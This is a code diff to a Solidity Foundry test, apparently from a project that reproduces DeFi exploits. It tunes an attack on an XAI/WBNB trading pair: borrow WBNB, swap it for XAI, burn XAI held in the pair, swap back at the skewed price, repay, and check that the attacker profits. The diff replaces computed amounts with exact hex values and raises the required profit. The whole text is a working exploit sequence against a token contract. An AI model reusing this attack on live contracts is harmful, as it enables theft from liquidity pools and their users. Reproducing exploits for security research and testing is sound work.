@@ -125,7 +125,7 @@ contract XAITestBase is Test, BlockLoader {
     }
 
     function attackGoal() public view returns (bool) {
-        return wbnb.balanceOf(attacker) >= 1e3 + balanceOfwbnbattacker;
+        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
     }
 
     function borrow_wbnb_owner(uint256 amount) internal eurus {
@@ -173,21 +173,15 @@ contract XAITestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_wbnb_owner(3000 * 1e18);
+        borrow_wbnb_owner(0xa2af3dc00543400000);
         printBalance("After step0 ");
-        swap_pair_attacker_wbnb_xai(
-            wbnb.balanceOf(attacker),
-            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
-        );
+        swap_pair_attacker_wbnb_xai(0xa2a15d09519be00000, 0x142ffed757491900000000000);
         printBalance("After step1 ");
-        burn_xai_pair(10000);
+        burn_xai_pair(0x2710);
         printBalance("After step2 ");
-        swap_pair_attacker_xai_wbnb(
-            xai.balanceOf(attacker),
-            pair.getAmountOut(xai.balanceOf(attacker), address(xai))
-        );
+        swap_pair_attacker_xai_wbnb(0x2629, 0xa2a23b14bcd6580000);
         printBalance("After step3 ");
-        payback_wbnb_owner(3000 * 1e18);
+        payback_wbnb_owner(0xa2afacc5bae0800000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
